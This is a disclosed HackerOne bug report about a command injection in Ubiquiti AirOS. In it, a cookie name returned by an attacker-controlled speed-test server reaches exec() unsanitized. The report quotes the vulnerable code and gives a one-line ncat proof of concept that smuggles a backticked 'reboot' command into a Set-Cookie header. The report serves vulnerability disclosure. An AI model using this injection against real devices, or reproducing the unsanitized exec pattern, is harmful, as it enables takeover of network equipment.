# Read-Only user can execute arbitraty shell commands on AirOS

## Report Details
- **Report ID**: 128750
- **URL**: https://hackerone.com/reports/128750
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-04-06T16:54:03.718Z
- **Disclosed**: 2016-08-05T09:36:57.479Z

## Reporter
- **Username**: rbran
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
This issue is similar to #119317, but happen on the server side data (actionRemote).

The function "parseHeaders" in remote.inc:38 don't sanitize the input received from the other server (other side of the speed test). If the attacker started an speed test against a controlled server (attacker itself) and returned a cookie with special shell character will be possible to inject commands.

Injection Point:
```
Function parseHeaders $headers
(
	global $session_key, $session_value;
	$cookie_regex = "^Set-Cookie: ([AIROS_[:print:]]+)=([[:alnum:]]{32});";

	$i = 0;
	while ($i < count($headers)) {
		if (ereg($cookie_regex, $headers[$i], $regs)) {
			$session_key = $regs[1];  //code injection in this variable
			$session_value = $regs[2];
			return 0;
		}
		$i++;
	}
	return $i;
);
```

On doLogin (remote.inc:144, via buildCookieStr), the "$session_key" variable is passed to be executed without verification.

remote.inc:146, doLogin():
```
	$session_str = buildCookieStr(); //return the session_key value

	$cfgfile = "/tmp/.trigger.txt";
	writeConfig($cfgfile, $login, $passwd);

	$cmd = $cmd_trigger + $session_str; //now cmd have shell code
	$cmd += " -c $cfgfile";

	$url = EscapeShellCmd($base_url + "/login.cgi");
	$full_cmd = "$cmd $url";  //now full_cmd have shell code

	exec($full_cmd, $lines, $res); //shell code executed
```

#Reproducing the attack:
Fist run the server that will return the cookie: 
```
$ echo -en "HTTP/1.1 200 OK\r\nSet-Cookie: AIROS_\`reboot\`=12345678901234567890123456789012;\r\nContent-Length: 1\r\nContent-Type: text/html\r\n\r\nA" | ncat -l -p 8080
```

Then execute the speed test against this target.

In this Exemple: http://192.168.1.100:8080

I Hope you like this report, because I burned my new PicoStation while trying to unbrick it using a ttl cable, after a unsuccessful downgrade :(

## Attachments
No attachments
